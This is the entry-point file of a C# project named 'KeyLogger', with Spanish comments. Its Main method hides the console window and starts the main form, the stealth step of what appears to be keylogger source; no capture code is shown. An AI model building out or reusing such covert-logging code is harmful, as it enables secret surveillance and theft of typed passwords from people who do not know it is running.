using System;
using System.Windows.Forms;

namespace KeyLogger
{
	static class Program
	{
		/// <summary>
		///		Método principal
		/// </summary>
		[STAThread]
		static void Main()
		{
			// Oculta la consola
			WindowsApi.ShowWindow(WindowsApi.GetConsoleWindow(), WindowsApi.SW_HIDE);
			// Inicia la aplicación
			Application.Run(new frmMain());
		}
	}
}